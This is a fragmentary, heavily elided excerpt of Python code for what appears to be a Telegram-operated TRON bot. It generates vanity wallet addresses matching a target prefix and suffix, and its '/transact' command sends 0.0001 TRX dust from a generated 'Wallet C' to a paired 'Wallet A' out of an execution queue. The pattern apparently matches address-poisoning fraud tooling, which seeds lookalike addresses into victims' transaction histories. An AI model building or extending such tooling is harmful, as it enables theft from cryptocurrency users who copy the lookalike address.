...
def generate_vanity_wallet(prefix_target, suffix_target, max_attempts=500000000):
    """
...
def cmd_transact(parts):
    """Send 0.0001 TRX from an approved/generated Wallet C to its Wallet A."""
    if len(parts) != 2:
        send_telegram(
            "❌ Usage: <code>/transact [wallet_c_address]</code>\n\n"
            "Sends <b>0.0001 TRX</b> from Wallet C to its associated Wallet A."
        )
        return

    wallet_c_address = parts[1]
    row = db.execute(
        """SELECT * FROM execution_queue
           WHERE lower(wallet_c_address) = lower(?)
           AND status IN ('approved', 'completed', 'triggering')
    ...
    if not row:
        send_telegram(
            f"❌ No approved/generated Wallet C found for:\n<code>{wallet_c_address}</code>"
        )
        return
    ...
    try:
        ...
        if actual_c != row["wallet_c_address"]:
            raise ValueError("Wallet C private key does not match the stored Wallet C address.")

        tx = (
            tron.trx.transfer(actual_c, row["wallet_a"], 0.0001)
            .build().sign(c_priv).broadcast()
        )
        txid = tx["txid"] if isinstance(tx, dict) and "txid" in tx else tx.txid

        send_telegram(
            f"✅ <b>TRANSACT SENT — Pair #{row['id']}</b>\n\n"
            f"💸 Wallet C → Wallet A: <b>0.0001 TRX</b>\n"
            f"C: <code>{actual_c}</code>\n"
            f"A: <code>{row['wallet_a']}</code>\n"
            f"TX: <code>{txid}</code>\n\n"
            f"<a href='https://tronscan.org/#/transaction/{txid}'>View transaction</a>"
        )
    except Exception as e:
        log.exception("Manual transact failed for Pair #%s.", row["id"])
        send_telegram(f"❌ <b>TRANSACT FAILED — Pair #{row['id']}</b>\n<code>{str(e)[:1000]}</code>")
...
def handle_command(text):
    ...
    if cmd == "add":
        ...
        send_telegram(
            ...
            "<code>transact [wallet_c_address]</code> — Send 0.0001 TRX from Wallet C to Wallet A\\n"
